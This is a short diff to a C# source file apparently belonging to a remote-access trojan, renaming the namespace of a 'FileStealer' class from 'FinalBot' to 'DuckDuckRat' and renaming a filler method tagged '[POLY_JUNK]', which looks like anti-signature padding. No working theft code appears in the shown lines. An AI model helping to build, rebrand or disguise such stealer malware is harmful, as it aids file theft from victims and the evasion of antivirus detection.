@@ -4,12 +4,12 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Threading.Tasks;
 
-namespace FinalBot.Stealers
+namespace DuckDuckRat.Stealers
 {
     public class FileStealer
     {
         // [POLY_JUNK]
-        private static void _vanguard_2faf0fa9() {
+        private static void _DuckDuckRat_2faf0fa9() {
             int val = 60306;
             if (val > 50000) Console.WriteLine("Hash:" + 60306);
         }
@@ -85,3 +85,5 @@ namespace FinalBot.Stealers
         }
     }
 }
+
+
